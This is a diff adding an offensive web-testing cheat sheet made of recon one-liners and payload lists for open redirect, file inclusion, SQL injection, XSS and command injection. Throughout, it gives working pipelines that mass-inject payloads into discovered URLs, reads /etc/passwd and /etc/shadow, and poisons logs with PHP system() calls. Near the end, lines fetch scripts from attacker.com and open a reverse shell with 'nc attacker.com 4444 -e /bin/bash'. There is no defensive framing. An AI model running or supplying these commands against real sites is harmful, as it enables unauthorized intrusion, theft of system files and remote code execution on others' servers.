@@ -1,0 +1,571 @@
+🔁 Open Redirect:
+subfinder -d site.com -silent | waybackurls | gf redirect | qsreplace 'https://evil.com' | httpx -fr -match-string 'evil.com'
+echo "site.com" | gau | grep -Ei 'url=|redirect=|next=|data=' | qsreplace 'https://evil.com' | httpx -match-string 'evil.com'
+gau site.com | grep -Ei 'redirect=|url=' | qsreplace 'https://<collab>.burpcollaborator.net' | httpx -silent -follow-redirects
+python3 paramspider.py -d site.com --exclude jpg,png,css,js | grep -Ei 'redirect=|url=' | qsreplace 'https://evil.com' | httpx -match-string 'evil.com'
+gau site.com | grep '=' | qsreplace 'https://evil.com' | xargs -I % curl -Ls -o /dev/null -w "%{url_effective} %{http_code}\n" "%"
+
+gau site.com | grep -Ei 'redirect=|url=|next=|data=' | qsreplace 'https://evil.com' | httpx -follow-redirects -mc 200 -match-string 'evil.com'
+waybackurls site.com | gf redirect | qsreplace 'https://evil.com' | httpx -follow-redirects -match-string 'evil.com'
+python3 paramspider.py -d site.com | grep -Ei 'redirect=|url=' | qsreplace 'https://evil.com' | httpx -match-string 'evil.com'
+cat open_redirect_payloads.txt | while read payload; do gau site.com | grep '=' | qsreplace "$payload" | httpx -follow-redirects -match-string 'evil.com'; done
+gau site.com | grep -Ei 'redirect=|url=' | qsreplace 'https://evil.com' | xargs -I % curl -Ls -o /dev/null -w "%{url_effective} %{http_code}\n" "%"
+
+cat payloads.txt | while read payload; do gau site.com | grep -Ei 'redirect=|url=|next=|return=|dest=' | qsreplace "$payload" | httpx -follow-redirects -silent -mc 200 -match-string "$payload"; done
+
+Payload:
+https://evil.com
+//evil.com
+///evil.com
+https:evil.com
+%2F%2Fevil.com
+%2f%2e%2e%2fevil.com
+evil.com%23@site.com
+
+📂 Local File Inclusion (LFI):
+echo "site.com" | gau | gf lfi | qsreplace '../../../../etc/passwd' | httpx -match-regex 'root:.*:0:0:'
+subfinder -d site.com -silent | waybackurls | grep "=" | qsreplace "../../../../../../etc/passwd" | httpx -mc 200 -match-regex "root:.*:0:0:"
+cat lfi_urls.txt | qsreplace "../../../../../../etc/passwd" | parallel -j50 -q curl -s {} | grep "root:"
+ffuf -w /path/to/lfi.txt -u "https://site.com/page?file=FUZZ" -mc 200 -mr "root:x"
+gau site.com | grep '=' | qsreplace "/var/log/apache2/access.log" | httpx -silent -mc 200
+
+waybackurls site.com | grep "=" | qsreplace "../../../../etc/passwd" | httpx -mc 200 -match-regex "root:.*:0:0:"
+cat lfi_payloads.txt | while read payload; do gau site.com | grep "=" | qsreplace "$payload" | httpx -mc 200 -match-regex "root:"; done
+gau site.com | grep "=" | qsreplace "../../../../etc/passwd" | httpx -mc 200 -match-regex "root:"
+ffuf -w lfi_payloads.txt -u "https://site.com/page=FUZZ" -mc 200 -mr "root:"
+cat lfi_payloads.txt | while read payload; do curl -sk "https://site.com/index.php?page=$payload" | grep "root:" && echo "Possible LFI: $payload"; done
+
+cat payloads.txt | while read payload; do gau site.com | grep '=' | qsreplace "$payload" | httpx -silent -mc 200 -match-regex 'root:x|[a-z]*:x:0:0:'; done
+
+Payload:
+../../../../../../etc/passwd
+..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/etc/passwd
+
+Sqli: cat payloads.txt | while read payload; do curl -s "https://target.com/page.php?id=$payload"; done
+
+'test
+1' OR '1'='1
+admin' --
+" OR 1=1 --
+') OR ('1'='1
+1 AND 1=1
+1 UNION SELECT null,null--
+' OR sleep(5)--
+admin' # 
+
+%27test
+1%27%20OR%20%271%27%3D%271
+admin%27%20-- 
+%22%20OR%201%3D1%20-- 
+%27%29%20OR%20%281%27%3D%271 
+1%20AND%201%3D1 
+1%20UNION%20SELECT%20null%2Cnull-- 
+%27%20OR%20sleep%285%29-- 
+admin%27%20%23 
+
+XSS : cat payloads.txt | while read payload; do curl -s "https://target.com/search?q=$payload"; done
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+"><body onload=alert(1)>
+<iframe src="javascript:alert('XSS')">
+<svg><script>alert(1)</script>
+<math><mi//xlink:href="data:x,alert(1)">
+"><details open ontoggle=confirm(1)>
+"><input onfocus=alert(1) autofocus>
+
+%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E
+%22%3E%3Cbody%20onload%3Dalert%281%29%3E
+%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E
+%3Csvg%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%3Cmath%3E%3Cmi%2F%2Fxlink%3Ahref%3D%22data%3Ax%2Calert%281%29%22%3E
+%22%3E%3Cdetails%20open%20ontoggle%3Dconfirm%281%29%3E
+%22%3E%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E
+
+LFI : cat payloads.txt | while read payload; do curl -s "https://target.com/index.php?page=$payload"; done
+
+/etc/passwd
+../../../../../../etc/passwd
+..././..././..././etc/passwd
+../../../../../proc/self/environ
+../../../../../../windows/win.ini
+php://filter/convert.base64-encode/resource=index.php
+../../../../../../boot.ini
+../../../../../../etc/shadow
+
+%2Fetc%2Fpasswd
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+...%2F.%2F...%2F.%2F...%2F.%2Fetc%2Fpasswd
+..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron
+..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini
+php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php
+..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
+ 
+RFI : cat payloads.txt | while read payload; do curl -s "https://target.com/load.php?file=$payload"; done
+
+http://evil.com/shell.txt
+https://attacker.com/backdoor.php
+http://example.com/malicious.js
+http://attacker.site/evil.php
+http://127.0.0.1:8080/shell.txt
+http://attacker.com/shell?cmd=ls
+http://evil.com/cmd.txt?c=ls
+http://your-ip/shell.txt
+
+http%3A%2F%2Fevil.com%2Fshell.txt
+https%3A%2F%2Fattacker.com%2Fbackdoor.php
+http%3A%2F%2Fexample.com%2Fmalicious.js
+http%3A%2F%2Fattacker.site%2Fevil.php
+http%3A%2F%2F127.0.0.1%3A8080%2Fshell.txt
+http%3A%2F%2Fattacker.com%2Fshell%3Fcmd%3Dls
+http%3A%2F%2Fevil.com%2Fcmd.txt%3Fc%3Dls
+http%3A%2F%2Fyour-ip%2Fshell.txt
+
+🐞 SQL Injection (SQLi):
+# 1. Passive SQLi pattern discovery using GF
+waybackurls example.com | gf sqli | tee sqli.txt
+
+# 2. Active scan using sqlmap
+sqlmap -m sqli.txt --batch --random-agent --level=3
+
+# 3. Manual fuzz with payloads
+cat payloads.txt | while read p; do curl -s "https://site.com/page.php?id=$p"; done
+
+# 4. Passive + active recon
+gau site.com | gf sqli | qsreplace "' OR '1'='1" | httpx -silent -mc 200
+
+# 5. Test union injection
+curl -s "https://target.com/page.php?id=1 UNION SELECT null,null--"
+
+# 6. Sleep-based time delay
+curl -s "https://target.com/page.php?id=1' OR SLEEP(5)--+"
+
+# 7. Error-based SQLi via URL
+curl -s "https://target.com/page.php?id=1'" | grep -Ei "SQL|mysql|syntax"
+
+# 8. SQLi with Burp Collaborator (OAST)
+curl "https://site.com/page.php?id=1'+UNION+SELECT+load_file('\\\\oast.dnslog.cn\\abc')--+"
+
+# 1. Bypass WAF using case + inline comments
+curl "https://target.com/page?id=1/**/UNION/**/SELECT/**/NULL,NULL--"
+
+# 2. Use char() to encode strings
+curl "https://target.com/page?id=1 UNION SELECT char(115,113,108),version()--"
+
+# 3. Blind SQLi (true/false testing)
+curl "https://site.com/item?id=1 AND 1=1" -s | md5sum
+curl "https://site.com/item?id=1 AND 1=2" -s | md5sum
+
+# 4. Stacked queries with sleep delay
+curl "https://target.com/page.php?id=1;SELECT SLEEP(5)--+" -m 7
+
+# 5. Hex-based bypass
+curl "https://target.com/page?id=1 UNION SELECT 0x41414141--"
+
+🐞 Cross-Site Scripting (XSS):
+# 1. Gather potential XSS params
+gau site.com | gf xss | tee xss.txt
+
+# 2. Fuzz XSS params with payloads.txt
+cat payloads.txt | while read p; do curl -s "https://target.com/search?q=$p"; done
+
+# 3. Passive XSS check using uro
+gau site.com | grep "=" | uro | gf xss | qsreplace '<script>alert(1)</script>' | httpx -mc 200
+
+# 4. Use XSS Hunter or KnoXSS (API key required)
+cat xss.txt | while read u; do curl -X POST -d "target=$u" -H "X-API-KEY: YOUR_API" https://knoxss.me/api/v3; done
+
+# 5. Injecting SVG payload
+curl "https://site.com/search?q=%3Csvg/onload=alert(1)%3E"
+
+# 6. XSS via HTML body tag
+curl "https://target.com/page?q=<body onload=alert(1)>"
+
+# 7. DOM-based XSS path discovery
+hakrawler -url https://site.com | grep "#" | grep "="
+
+# 8. JS parsing for endpoints
+subjs -i site.com | while read js; do curl -s $js | grep -oP ".*alert.*"; done
+
+# 1. Bypass using backticks (for React, Angular)
+curl "https://site.com?q=`alert(1)`"
+
+# 2. Template injection in Angular apps
+curl "https://site.com?q={{constructor.constructor('alert(1)')()}}"
+
+# 3. UTF-7 based XSS
+curl -H "Content-Type: text/html; charset=UTF-7" --data "+ADw-script+AD4-alert('XSS');+ADw-/script+AD4-" https://site.com
+
+# 4. Bypass using malformed tag
+curl "https://site.com?q=<svg><g/onload=alert(1)>"
+
+# 5. Obfuscation using fromCharCode
+curl "https://target.com?q=<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"
+
+🐞 Local File Inclusion (LFI):
+# 1. LFI pattern extraction using GF
+gau site.com | gf lfi | tee lfi.txt
+
+# 2. LFI with payload injection
+cat lfi.txt | qsreplace "../../../../../../etc/passwd" | httpx -mc 200 -match-regex "root:x"
+
+# 3. Brute-force LFI payloads
+cat payloads.txt | while read p; do curl -s "https://site.com/page.php?file=$p"; done
+
+# 4. Detect /proc/self/environ inclusion
+curl "https://target.com/index.php?page=../../../../../../proc/self/environ"
+
+# 5. LFI with PHP wrapper
+curl "https://site.com/index.php?page=php://filter/convert.base64-encode/resource=index"
+
+# 6. Detect LFI via win.ini (Windows)
+curl "https://target.com/index.php?page=../../../../windows/win.ini"
+
+# 7. Bypass using dot-dot-slash with URL encoding
+curl "https://site.com/?page=..%2F..%2F..%2Fetc%2Fpasswd"
+
+# 8. LFI via log poisoning (manual follow-up required)
+curl -A "<?php system('id'); ?>" https://target.com && curl "https://target.com/index.php?page=/var/log/apache2/access.log"
+
+# 1. LFI via wrapper (PHP base64 encode)
+curl "https://site.com/index.php?page=php://filter/convert.base64-encode/resource=index"
+
+# 2. Null byte bypass (legacy, works in rare PHP 5.x)
+curl "https://site.com/index.php?page=../../../../etc/passwd%00"
+
+# 3. /proc/self/environ poisoning trick
+curl -A "<?php system('id'); ?>" https://site.com && curl "https://site.com/index.php?page=/proc/self/environ"
+
+# 4. LFI with data:// wrapper
+curl "https://site.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg=="
+
+# 5. Windows LFI with PHP include
+curl "https://site.com/page.php?file=C:/Windows/win.ini"
+
+🐞 Remote File Inclusion (RFI):
+# 1. RFI using external shell
+curl "https://target.com/page.php?file=http://evil.com/shell.txt"
+
+# 2. URL-encoded RFI test
+curl "https://site.com/page.php?file=http%3A%2F%2Fevil.com%2Fshell.txt"
+
+# 3. Inject and detect remote PHP script
+curl "https://target.com/load.php?file=http://attacker.site/backdoor.php"
+
+# 4. Use collaborator or dnslog.cn
+curl "https://site.com/page.php?file=http://oast.dnslog.cn/shell.txt"
+
+# 5. RFI fuzzing with payloads.txt
+cat payloads.txt | while read p; do curl -s "https://site.com/index.php?page=$p"; done
+
+# 6. Malicious script hosting test
+curl -s "https://target.com/load.php?file=http://your-ip/malicious.js"
+
+# 7. Force inclusion with null byte (legacy)
+curl "https://target.com/page.php?file=http://evil.com/shell.txt%00"
+
+# 8. POST-based RFI attempt
+curl -X POST -d "page=http://evil.com/shell.txt" https://target.com/index.php
+
+# 1. Load external script with query string trick
+curl "https://target.com/load.php?url=http://evil.com/shell.php?"
+
+# 2. Force RFI with PHP's input wrapper
+curl "https://target.com/index.php?page=php://input" -d '<?php system("id"); ?>'
+
+# 3. RFI bypass with user-agent controlled SSRF + inclusion
+curl -H "X-Forwarded-Host: evil.com" "https://target.com/index.php?page=http://localhost"
+
+# 4. Use GitHub raw to simulate real world RFI
+curl "https://site.com/page.php?file=https://raw.githubusercontent.com/user/repo/main/shell.php"
+
+# 5. Encoded RFI bypass
+curl "https://site.com/index.php?page=http%3A%2F%2Fevil.com%2Fshell.txt"
+
+🐞 Open Redirect:
+# 1. Classic open redirect pattern
+curl "https://site.com/redirect?next=https://evil.com" -I
+
+# 2. Using payloads.txt to brute-force
+cat payloads.txt | while read p; do curl -s -L "https://site.com/redirect?url=$p"; done
+
+# 3. Redirect via `url` param + check Location header
+curl -i "https://site.com/go?url=https://evil.com" | grep Location
+
+# 4. Bypass filter with `//evil.com`
+curl "https://site.com/redirect?next=//evil.com"
+
+# 5. Use `@` symbol to obscure
+curl "https://site.com/redirect?next=https://google.com@evil.com"
+
+# 6. HTML meta refresh check
+curl "https://site.com/redirect?url=evil.com" | grep -i "http-equiv"
+
+# 7. Nuclei template for redirect
+echo "https://site.com" | nuclei -t http/redirect-open-redirect.yaml
+
+# 8. Detect open redirect with URL fragment trick
+curl "https://site.com/redirect?next=https://site.com#@evil.com"
+
+# 1. Bypass using encoded `@` trick
+curl "https://site.com/redirect?url=https://google.com%40evil.com"
+
+# 2. Use data URI (can trigger SSRF or JS)
+curl "https://site.com/redirect?next=data:text/html,<script>alert(1)</script>"
+
+# 3. Unicode encoding (rare bypass)
+curl "https://site.com/redirect?next=%u002f%u002fevil.com"
+
+# 4. Redirect via sub-path injection
+curl "https://site.com/redirect?next=/\evil.com"
+
+# 5. Force redirect using URL fragment trick
+curl "https://site.com/redirect?next=https://site.com#@evil.com"
+
+RCE:
+# 1. Basic RCE in query param
+curl "https://site.com/vuln.php?cmd=whoami"
+
+# 2. PHP wrapper with code injection
+curl "https://site.com/index.php?page=data:text/plain,<?php system('id'); ?>"
+
+# 3. Header-based RCE
+curl -H "X-Forwarded-For: 127.0.0.1;`id`" https://site.com
+
+# 4. Command injection via semicolon
+curl "https://site.com/ping?host=127.0.0.1;id"
+
+# 5. Command injection via pipe
+curl "https://site.com/ping?host=127.0.0.1|id"
+
+# 6. RCE via $() substitution
+curl "https://site.com/ping?host=\$(id)"
+
+# 7. Bash injection with backticks
+curl "https://site.com/run?input=\`id\`"
+
+# 8. POST param injection
+curl -X POST -d "user=admin&pass=test;id" https://site.com/login
+
+# 1. Encoded semicolon
+curl "https://site.com/ping?host=127.0.0.1%3Bid"
+
+# 2. Encoded pipe
+curl "https://site.com/ping?host=127.0.0.1%7Cid"
+
+# 3. Encoded backticks
+curl "https://site.com/run?input=%60id%60"
+
+# 4. Encoded $() syntax
+curl "https://site.com/run?input=%24%28id%29"
+
+# 5. Encoded PHP wrapper
+curl "https://site.com/index.php?page=data%3Atext%2Fplain%2C%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E"
+
+# 6. Encoded POST body (use --data-urlencode)
+curl --data-urlencode "user=admin" --data-urlencode "pass=test;id" https://site.com/login
+
+# 7. Encoded command chaining with &&
+curl "https://site.com/cmd?exec=ls%20%26%26%20id"
+
+# 8. Double URL encoded
+curl "https://site.com/run?input=%2560id%2560"
+
+Payload:
+127.0.0.1;id
+127.0.0.1|id
+$(id)
+`id`
+127.0.0.1&&id
+127.0.0.1%3Bid
+php://input
+data://text/plain,<?php system('id'); ?>
+
+cat payloads.txt | while read line; do curl -s "https://site.com/vuln?input=$line"; done
+cat payloads.txt | while read line; do curl -X POST -d "cmd=$line" https://site.com/vuln; done
+cat payloads.txt | xargs -I % -P 20 curl -s "https://site.com/test?cmd=%"
+cat payloads.txt | parallel -j 20 "curl -s 'https://site.com/cmd?exec={}'"
+
+XSS:
+<script>alert(1)</script>
+"><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+%3Csvg%2Fonload%3Dalert(1)%3E
+%3Cbody%20onload%3Dalert(1)%3E
+%3Ciframe%20src%3D%22javascript%3Aalert(1)%22%3E%3C%2Fiframe%3E
+%3Cdetails%20open%20ontoggle%3Dalert(1)%3E
+%3Cinput%20autofocus%20onfocus%3Dalert(1)%3E
+
+curl "https://target.com/page?input=<button onclick=alert(1)>CLICK</button>"
+curl -H "User-Agent: <script>alert(1)</script>" https://target.com
+cat urls.txt | qsreplace '<img src=x onerror=alert(1)>' | httpx -silent -fr -mc 200 | grep "alert"
+linkfinder.py -i https://site.com/app.js -o cli | grep "document.URL\|location"
+gau site.com | grep "=" | gf xss | while read url; do curl -s "$url<svg/onload=alert(1)>"; done
+curl "https://target.com/page/%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+curl "https://target.com/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+curl "https://target.com/search?q=<script>alert(1)</script>"
+
+cat urls.txt | gf xss | qsreplace '<svg/onload=alert(1)>' | httpx -silent -fr -mc 200
+cat payloads.txt | xargs -I % -P 20 curl -s "https://target.com/?search=%"
+cat payloads.txt | while read p; do curl -X POST -d "name=$p" https://target.com/contact; done
+cat payloads.txt | while read p; do curl -s "https://target.com/search?q=$p"; done
+
+Common Step:
+subfinder -d site.com -silent | httpx -silent -mc 200 > 200.txt
+
+cat 200.txt | waybackurls > sqli_wayback.txt
+cat 200.txt | katana -silent -u > sqli_katana.txt
+paramspider -d site.com -o sqli_paramspider.txt
+cat sqli_wayback.txt sqli_katana.txt sqli_paramspider.txt | sort -u | gf sqli > sqli_candidates.txt
+cat sqli_candidates.txt | qsreplace -a | while read url; do ffuf -u "$url" -w sqli_payloads.txt -mc 200; done
+
+
+cat 200.txt | waybackurls > xss_wayback.txt
+cat 200.txt | katana -silent -u > xss_katana.txt
+paramspider -d site.com -o xss_paramspider.txt
+cat xss_wayback.txt xss_katana.txt xss_paramspider.txt | sort -u | gf xss > xss_candidates.txt
+cat xss_candidates.txt | qsreplace -a | while read url; do ffuf -u "$url" -w xss_payloads.txt -mc 200; done
+
+cat 200.txt | waybackurls > redirect_wayback.txt
+cat 200.txt | katana -silent -u > redirect_katana.txt
+paramspider -d site.com -o redirect_paramspider.txt
+cat redirect_wayback.txt redirect_katana.txt redirect_paramspider.txt | sort -u | gf redirect > redirect_candidates.txt
+cat redirect_candidates.txt | qsreplace "https://evil.com" | httpx -fr -mc 200 -title | grep "evil.com"
+
+cat 200.txt | waybackurls > lfi_wayback.txt
+cat 200.txt | katana -silent -u > lfi_katana.txt
+paramspider -d site.com -o lfi_paramspider.txt
+cat lfi_wayback.txt lfi_katana.txt lfi_paramspider.txt | sort -u | gf lfi > lfi_candidates.txt
+cat lfi_candidates.txt | qsreplace -a | while read url; do ffuf -u "$url" -w lfi_payloads.txt -mc 200; done
+
+cat 200.txt | waybackurls > rfi_wayback.txt
+cat 200.txt | katana -silent -u > rfi_katana.txt
+paramspider -d site.com -o rfi_paramspider.txt
+cat rfi_wayback.txt rfi_katana.txt rfi_paramspider.txt | sort -u | gf rfi > rfi_candidates.txt
+cat rfi_candidates.txt | qsreplace "http://evil.com/shell.txt" | httpx -silent -mc 200
+
+cat 200.txt | waybackurls > rce_wayback.txt
+cat 200.txt | katana -silent -u > rce_katana.txt
+paramspider -d site.com -o rce_paramspider.txt
+cat rce_wayback.txt rce_katana.txt rce_paramspider.txt | sort -u | gf rce > rce_candidates.txt
+cat rce_candidates.txt | qsreplace -a | while read url; do ffuf -u "$url" -w rce_payloads.txt -mc 200; done
+
+cat recon.txt | gf sqli | sort -u > sqli.txt
+cat recon.txt | gf xss | sort -u > xss.txt
+cat recon.txt | gf redirect | sort -u > openredirect.txt
+cat recon.txt | gf lfi | sort -u > lfi.txt
+cat recon.txt | gf rfi | sort -u > rfi.txt
+cat recon.txt | gf idor | sort -u > idor.txt
+cat recon.txt | gf ssti | sort -u > ssti.txt
+cat recon.txt | gf interestingExt | sort -u > extensions.txt
+cat wayback.txt katana.txt paramspider.txt | sort -u > recon.txt
+cat wayback.txt katana.txt paramspider.txt | sort -u | gf sqli > sqli.txt
+
+cat wayback.txt katana.txt paramspider.txt | sort -u | tee recon.txt | (gf sqli > sqli.txt & gf xss > xss.txt & gf redirect > openredirect.txt & gf lfi > lfi.txt & gf rfi > rfi.txt & gf rce > rce.txt & gf ssti > ssti.txt & gf idor > idor.txt & gf interestingExt > extensions.txt)
+
+cat link.txt | qsreplace FUZZ | while read url; do cat payload.txt | while read payload; do full=$(echo "$url" | sed "s/FUZZ/$payload/"); curl -sk "$full" | grep -q "root:x" && echo "[+] LFI Found: $full"; done; done
+
+cat link.txt | qsreplace FUZZ | while read url; do cat payload.txt | while read payload; do full=$(echo "$url" | sed "s/FUZZ/$payload/"); curl -sk "$full" | grep -qi "alert" && echo "[+] XSS Found: $full"; done; done
+
+cat link.txt | qsreplace FUZZ | while read url; do cat payload.txt | while read payload; do full=$(echo "$url" | sed "s/FUZZ/$payload/"); curl -sk "$full" | grep -Ei "SQL|syntax|mysql_fetch|ORA-" && echo "[+] SQLi Found: $full"; done; done
+
+cat link.txt | qsreplace FUZZ | while read url; do cat payload.txt | while read payload; do full=$(echo "$url" | sed "s/FUZZ/$payload/"); curl -sk "$full" | grep -Ei "uid=|root|admin|whoami" && echo "[+] RCE Found: $full"; done; done
+
+cat link.txt | qsreplace FUZZ | while read url; do cat payload.txt | while read payload; do full=$(echo "$url" | sed "s/FUZZ/$payload/"); curl -sk "$full" | grep -Ei "uid=|root|admin|whoami" && echo "[+] RCE Found: $full"; done; done
+
+cat link.txt | qsreplace "https://example.com" | while read url; do curl -sk -I "$url" | grep -q "example.com" && echo "[+] Open Redirect: $url"; done
+
+ffuf -u "URL" -w link.txt:URL -w payload.txt:PAY -fc 200 -fr "Location" -input-cmd 'echo ${URL//FUZZ/$PAY}' -t 50
+
+ffuf -u "URL" -w link.txt:URL -w payload.txt:PAY -mr "uid=|whoami|root" -input-cmd 'echo ${URL//FUZZ/$PAY}' -t 50
+
+
+XSS:
+<script>alert(1)</script>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+<img src=x onerror=alert(1)>
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+<svg onload=alert(1)>
+%3Csvg%20onload%3Dalert(1)%3E
+javascript:alert(1)
+javascript%3Aalert(1)
+<input onfocus=alert(1) autofocus>
+%3Cinput%20onfocus%3Dalert(1)%20autofocus%3E
+<script>confirm("XSS")</script>
+%3Cscript%3Econfirm(%22XSS%22)%3C%2Fscript%3E
+<a href=# onmouseover=alert('XSS')>Hover</a>
+%3Ca%20href%3D%23%20onmouseover%3Dalert(%27XSS%27)%3EHover%3C%2Fa%3E
+<div onpointerover=alert(1)>X</div>
+%3Cdiv%20onpointerover%3Dalert(1)%3EX%3C%2Fdiv%3E
+<body onload=alert('XSS')>
+%3Cbody%20onload%3Dalert(%27XSS%27)%3E
+<div style="width:expression(alert('XSS'));">
+%3Cdiv%20style%3D%22width%3Aexpression(alert(%27XSS%27))%3B%22%3E
+
+;id
+`id`
+$(id)
+`id`
+; curl http://attacker.com
+wget http://attacker.com/file.sh
+; curl http://x.sh
+; python -c 'import os;os.system("id")'
+
+⚙️ Payloads for RCE in Input Fields (Used in Forms):
+test;id
+test|id
+test$(id)
+test`id`
+test;cat /etc/passwd
+test;php -r 'system("id");'
+test;python -c 'import os;os.system("whoami")'
+test||ping -c 1 attacker.com
+
+cat urls.txt | gf rce | qsreplace '$(id)' | httpx -silent -fr -mc 200 | tee rce-output.txt
+cat urls.txt | gf rce | while read url; do cat payloads.txt | while read payload; do curl -s "${url/XXX/$payload}" | grep -Ei 'uid=|root|whoami'; done; done
+
+ffuf -u "https://site.com/page?cmd=FUZZ" -w payloads.txt -fs 0 -mc 200
+
+Payloads.txt:
+;id
+|id
+`id`
+$(id)
+;whoami
+;uname -a
+;curl http://attacker.com
+;ping -c 1 attacker.com
+;nc attacker.com 4444 -e /bin/bash
+python -c 'import os;os.system("id")'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
